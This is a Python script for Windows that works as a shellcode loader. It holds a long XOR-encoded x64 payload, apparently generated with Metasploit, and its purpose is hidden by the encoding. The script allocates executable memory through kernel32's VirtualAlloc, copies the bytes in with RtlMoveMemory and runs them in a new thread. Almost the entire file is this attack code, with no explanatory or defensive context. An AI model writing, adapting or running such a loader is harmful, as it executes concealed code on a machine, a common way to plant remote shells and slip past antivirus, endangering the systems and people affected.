import ctypes
import sys
from ctypes import *

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xae\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x14\xd5\xc1\x91\xef\xc2\x34"
buf += b"\xd4\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\xe8\x9d\x42\x75\x1f\x2a\xf8\xd4\x14\xd5\x80\xc0\xae"
buf += b"\x92\x66\x85\x42\x9d\xf0\x43\x8a\x8a\xbf\x86\x74\x9d"
buf += b"\x4a\xc3\xf7\x8a\xbf\x86\x34\x9d\x4a\xe3\xbf\x8a\x3b"
buf += b"\x63\x5e\x9f\x8c\xa0\x26\x8a\x05\x14\xb8\xe9\xa0\xed"
buf += b"\xed\xee\x14\x95\xd5\x1c\xcc\xd0\xee\x03\xd6\x39\x46"
buf += b"\x94\x90\xd9\x64\x90\x14\x5f\x56\xe9\x89\x90\x3f\xa4"
buf += b"\xb5\xac\x0c\xde\xc3\x9e\x6a\xb0\x34\xd4\x14\x5e\x41"
buf += b"\x19\xef\xc2\x34\x9c\x91\x15\xb5\xf6\xa7\xc3\xe4\x84"
buf += b"\x9f\x9d\xd9\xd5\x64\x82\x14\x9d\x15\x05\x22\xc7\xa7"
buf += b"\x3d\xfd\x95\x9f\xe1\x49\xd9\xee\x14\x79\xe5\xdd\x9d"
buf += b"\xf0\x51\x43\x83\xf5\x1d\x19\x94\xc0\x50\xd7\x22\x41"
buf += b"\x25\x58\xd6\x8d\xb5\xe7\x87\x0d\x05\x61\x0d\x99\xd5"
buf += b"\x64\x82\x10\x9d\x15\x05\xa7\xd0\x64\xce\x7c\x90\x9f"
buf += b"\x95\xdd\xd8\xee\x12\x75\x5f\x10\x5d\x89\x90\x3f\x83"
buf += b"\x6c\x95\x4c\x8b\x98\xcb\xae\x9a\x75\x8d\x55\x8f\x89"
buf += b"\x12\x03\xe2\x75\x86\xeb\x35\x99\xd0\xb6\x98\x7c\x5f"
buf += b"\x06\x3c\x8a\x6e\x10\x3d\x69\x9d\xaa\xa2\xb2\xa3\xb0"
buf += b"\xf1\x06\xd4\x14\x94\x97\xd8\x66\x24\x7c\x55\xf8\x75"
buf += b"\xc0\x91\xef\x8b\xbd\x31\x5d\x69\xc3\x91\xcf\x32\xf4"
buf += b"\x7c\x15\xa6\x80\xc5\xa6\x4b\xd0\x98\x9d\x24\x80\x2b"
buf += b"\xa3\xb5\x12\xd3\xeb\x00\x8d\x18\x05\xaa\x35\xd5\x14"
buf += b"\xd5\x98\xd0\x55\xeb\xb4\xbf\x14\x2a\x14\xfb\xe5\x83"
buf += b"\x6a\x84\x44\x98\xf0\x58\xa2\xf3\xf4\x9c\xeb\x15\x89"
buf += b"\x18\x2d\x8a\xcb\x14\x5c\x5c\x00\xd0\x55\x28\x3b\x0b"
buf += b"\xf4\x2a\x14\xd9\x66\x05\x5e\xc4\x55\x8d\x8d\x18\x0d"
buf += b"\x8a\xbd\x2d\x55\x6f\x58\x34\x9b\xa3\xcb\x01\x91\x15"
buf += b"\xb5\x9b\xa6\x3d\xfa\xa1\xf1\x3d\xde\x90\xef\xc2\x7c"
buf += b"\x57\xf8\xc5\x89\x18\x0d\x8f\x05\x1d\x7e\xd1\x80\xc9"
buf += b"\xa7\x4b\xcd\x95\xae\xd7\x18\x59\xb0\x3d\xe1\x57\xec"
buf += b"\xd5\xce\x1f\x82\xc2\x34\xd4\x5c\x56\x05\xb1\xb1\x4b"
buf += b"\xc2\x55\xe2\xe7\x7a\x89\x59\x8e\xb9\x4a\x14\xd4\xc1"
buf += b"\x91\x85\x82\x75\x8d\x7c\xd5\xd1\x91\xef\x83\x6c\x9c"
buf += b"\x9d\x27\x89\xa0\x26\x83\x8e\x8c\xb0\x86\x24\x6e\x3a"
buf += b"\x8a\xb9\x4c\x14\xd4\xc1\x91\xa6\x4b\xeb\x87\x42\x85"
buf += b"\x8c\xa0\x26\x8b\xbd\x24\x5c\x5c\x1b\xd9\x66\x3b\x75"
buf += b"\x6e\x16\x0c\x09\xce\x10\x17\x7c\x57\xd0\xf5\x42\x69"
buf += b"\xef\xbf\x1c\x8c\x55\x82\x98\xf9\xef\x82\x34\xd4\x55"
buf += b"\x8d\xab\x91\xb5\x83\x8e\xdf\x3b\xda\xf1\x6e\x3a\x95"
buf += b"\x6d\x95\xae\xa0\xaf\xdc\x8e\x3d\xe1\x9d\xeb\x1b\x28"
buf += b"\xb1\x10\x3d\xcb\x9c\x15\x16\x89\xb8\x29\xb7\x87\x9d"
buf += b"\x9d\x2b\x9e\xc8\xae\x9b\x75\x82\xfc\xc5\xc1\x91\xef"
buf += b"\xef\x64\x4f\x14\xed\x89\x4e\x65\x6f\xb7\x03\x1a\x45"
buf += b"\x64\x5f\x68\x9c\x7c\xe5\xd4\x9c\x48\x69\x45\x3c\xf4"
buf += b"\xa1\xef\x9d\xf0\x4a\xae\xc0\x28\xd4\x5c\x5c\x03\x11"
buf += b"\x0d\xcd\x36\xc8\x02\x94\x4b\x85\xef\x83\xb2\xc0\x0c"
buf += b"\x94\x49\x85\xef\x3c\xf4\xa1\xf7\x9d\xf0\x4a\x11\x02"
buf += b"\x75\xd6\x08\xd5\x80\x1b\xfb\xc2\x75\x52\x00\xcd\x80"
buf += b"\x19\xfb\xc2\x75\xd6\x00\xcd\x80\x1b\xfb\xd2\x75\xe4"
buf += b"\x05\x9c\x3e\x50\xa7\x3d\xfd\xa1\xcf\x8a\x80\x6e\x08"
buf += b"\x9a\x5e\xd4\x4d\x9c\x06\x53\x1f\x77\x96\x82\xeb\x00"
buf += b"\xc1\x91\xef\xc2\x34\xd4"

#PAGE_EXECUTE_READWRITEVIRTUAL_MEM
PAGE_EXECUTE_READWRITE  =  0x00000040 #
VIRTUAL_MEM  =  ( 0x1000 | 0x2000 ) #
buf_arr = bytearray (buf) #shellcode
buf_size = len(buf_arr) #shellcode
kernel32 = ctypes.cdll.LoadLibrary("kernel32.dll") #kernel32.dll
kernel32.VirtualAlloc.restype = ctypes.c_uint64 #c_uint64
sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE) #
buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr) #shellcode
#print(sc_ptr)
#print(buf_ptr)
kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(buf_size)) #dllshellcode

handle = kernel32.CreateThread(ctypes.c_int(0),
                               ctypes.c_int(0),
                               ctypes.c_uint64(sc_ptr),
                               ctypes.c_int(0),
                               ctypes.c_int(0),
                               ctypes.pointer(ctypes.c_int(0)))
kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
